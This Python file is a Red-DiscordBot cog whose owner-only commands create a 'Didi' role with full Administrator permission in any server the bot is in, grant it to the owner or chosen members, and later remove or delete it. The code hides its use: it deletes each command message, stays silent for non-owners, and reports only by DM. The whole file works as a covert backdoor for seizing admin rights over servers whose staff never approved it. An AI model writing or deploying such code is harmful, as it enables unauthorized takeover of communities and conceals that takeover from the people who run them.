from redbot.core import commands
import discord

class AdminRole(commands.Cog):
    """Owner-only cog to manage the special Didi Administrator role."""

    def __init__(self, bot):
        self.bot = bot

    # Make cog invisible to non-owners
    async def cog_check(self, ctx):
        return await self.bot.is_owner(ctx.author)

    async def cog_command_error(self, ctx, error):
        if isinstance(error, commands.CheckFailure):
            return  # silently ignore for non-owners
        raise error

    async def _send_dm(self, user: discord.User, message: str):
        """Helper to safely DM the owner."""
        try:
            await user.send(message)
        except discord.Forbidden:
            pass  # can't DM the owner, silently fail

    @commands.command(aliases=["ga"])
    async def giveadmin(self, ctx, *members: discord.Member):
        """
        Gives the Didi role (Administrator).
        Defaults to giving it to the bot owner if no members are specified.
        """
        await ctx.message.delete()  # delete command message
        guild = ctx.guild
        role_name = "Didi"

        # Get role or create it
        role = discord.utils.get(guild.roles, name=role_name)
        if role is None:
            try:
                role = await guild.create_role(
                    name=role_name,
                    permissions=discord.Permissions(administrator=True),
                    reason="Created by bot for admin access",
                )
                await self._send_dm(ctx.author, f"✅ Created new role `{role_name}` with Administrator permissions.")
            except discord.Forbidden:
                return await self._send_dm(ctx.author, "❌ I don't have permission to create roles.")
            except discord.HTTPException:
                return await self._send_dm(ctx.author, "❌ Failed to create role due to an API error.")

        # Default target: the owner themselves
        if not members:
            members = [ctx.author]

        # Apply role
        for member in members:
            try:
                await member.add_roles(role, reason="Given Administrator by bot owner command")
                await self._send_dm(ctx.author, f"✅ {member.mention} has been given the `{role_name}` role.")
            except discord.Forbidden:
                await self._send_dm(ctx.author, "❌ I don't have permission to give this role.")
            except discord.HTTPException:
                await self._send_dm(ctx.author, "❌ Failed to give role due to an API error.")

    @commands.command(aliases=["ra"])
    async def removeadmin(self, ctx, *members: discord.Member):
        """
        Removes the Didi role from given members.
        Defaults to removing from the owner if no members are specified.
        Deletes the role if unused.
        """
        await ctx.message.delete()
        guild = ctx.guild
        role_name = "Didi"

        role = discord.utils.get(guild.roles, name=role_name)
        if role is None:
            return await self._send_dm(ctx.author, "❌ The `Didi` role does not exist.")

        if not members:
            members = [ctx.author]

        for member in members:
            if role in member.roles:
                try:
                    await member.remove_roles(role, reason="Removed Administrator by bot owner command")
                    await self._send_dm(ctx.author, f"✅ {member.mention} no longer has the `{role_name}` role.")
                except discord.Forbidden:
                    return await self._send_dm(ctx.author, "❌ I don't have permission to remove this role.")
                except discord.HTTPException:
                    return await self._send_dm(ctx.author, "❌ Failed to remove role due to an API error.")
            else:
                await self._send_dm(ctx.author, f"ℹ️ {member.mention} does not have the `{role_name}` role.")

        # Delete if unused
        if not any(role in m.roles for m in guild.members):
            try:
                await role.delete(reason="Deleted unused Didi role")
                await self._send_dm(ctx.author, "🗑️ Deleted the unused `Didi` role.")
            except discord.Forbidden:
                await self._send_dm(ctx.author, "❌ I don't have permission to delete the role.")
            except discord.HTTPException:
                await self._send_dm(ctx.author, "❌ Failed to delete role due to an API error.")

    @commands.command(aliases=["dar"])
    async def deleteadminrole(self, ctx):
        """
        Force deletes the Didi role from the server.
        """
        await ctx.message.delete()
        guild = ctx.guild
        role_name = "Didi"

        role = discord.utils.get(guild.roles, name=role_name)
        if role is None:
            return await self._send_dm(ctx.author, "ℹ️ The `Didi` role does not exist.")

        try:
            await role.delete(reason="Force deleted by bot owner")
            await self._send_dm(ctx.author, "🗑️ Force deleted the `Didi` role.")
        except discord.Forbidden:
            await self._send_dm(ctx.author, "❌ I don't have permission to delete the role.")
        except discord.HTTPException:
            await self._send_dm(ctx.author, "❌ Failed to delete role due to an API error.")
